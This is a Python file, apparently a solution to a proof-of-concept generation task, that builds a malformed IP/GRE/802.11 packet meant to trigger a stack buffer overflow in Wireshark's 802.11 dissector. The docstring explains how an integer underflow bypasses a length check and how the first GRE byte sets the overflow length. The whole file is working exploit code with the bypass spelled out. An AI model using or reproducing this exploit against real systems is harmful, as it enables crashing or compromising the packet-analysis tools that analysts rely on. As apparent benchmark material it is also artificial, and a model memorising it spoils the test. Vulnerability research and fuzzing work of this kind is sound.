import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for CVE-2014-2301, a stack buffer overflow in the
        Wireshark 802.11 dissector.

        The vulnerability is triggered when dissecting an 802.11 frame encapsulated
        in GRE. The GRE dissector passes its header as a pseudo-header to the
        802.11 dissector. The 802.11 dissector misinterprets the first byte of
        the GRE header as a length (`fcs_len`) for a memcpy-like operation into
        a 45-byte stack buffer.

        To exploit this, we need to bypass a length check:
        `tvb_length_remaining(tvb, offset) >= fcs_len`.
        This is achieved via an integer underflow. We craft an 802.11 frame that
        claims to have a long MAC header (e.g., 30 bytes for a 4-address frame).
        The dissector calculates `offset = 30`. However, the actual payload is
        only 21 bytes long. The check `21 - 30 >= fcs_len` underflows, resulting
        in a large positive value, which bypasses the check.

        The PoC is a 45-byte IP packet:
        - IP Header (20 bytes): Protocol GRE (47).
        - GRE Header (4 bytes):
            - First byte (misinterpreted as `fcs_len`) is set to 46 to cause a
              1-byte overflow on the 45-byte stack buffer.
            - Protocol Type is 0x88BE (WLAN).
        - 802.11 Payload (21 bytes):
            - A crafted Frame Control field (`08 03`) indicates a 4-address
              frame, leading to the large `offset` and the integer underflow.
        """
        
        # IP Header (20 bytes)
        ip_ver_ihl = 0x45
        ip_dscp_ecn = 0x00
        ip_tot_len = 45
        ip_id = 1
        ip_flags_frag = 0
        ip_ttl = 64
        ip_proto = 47  # GRE
        ip_check = 0  # Placeholder for checksum
        ip_saddr = 0x7f000001  # 127.0.0.1
        ip_daddr = 0x7f000001  # 127.0.0.1

        ip_header_no_check = struct.pack('!BBHHHBBHII',
                                        ip_ver_ihl, ip_dscp_ecn, ip_tot_len,
                                        ip_id, ip_flags_frag,
                                        ip_ttl, ip_proto, ip_check,
                                        ip_saddr, ip_daddr)

        # Calculate IP checksum
        s = 0
        for i in range(0, len(ip_header_no_check), 2):
            w = (ip_header_no_check[i] << 8) + ip_header_no_check[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        ip_check = ~s & 0xffff

        ip_header = struct.pack('!BBHHHBBHII',
                                ip_ver_ihl, ip_dscp_ecn, ip_tot_len,
                                ip_id, ip_flags_frag,
                                ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)

        # GRE Header (4 bytes)
        # fcs_len = 46 to overflow a 45-byte buffer. This becomes the first byte.
        fcs_len = 46
        gre_flags_ver = (fcs_len << 8)
        # Protocol Type for 802.11 WLAN
        gre_proto = 0x88BE
        gre_header = struct.pack('!HH', gre_flags_ver, gre_proto)

        # 802.11 Payload (21 bytes)
        # Frame Control field (0x0308) for Type=Data, FromDS=1, ToDS=1.
        # This implies a 30-byte header, causing an integer underflow in the length check.
        # The bytes are 08 03 due to little-endian representation of the field.
        wlan_payload = b'\x08\x03' + b'\x00' * 19

        poc = ip_header + gre_header + wlan_payload
        
        return poc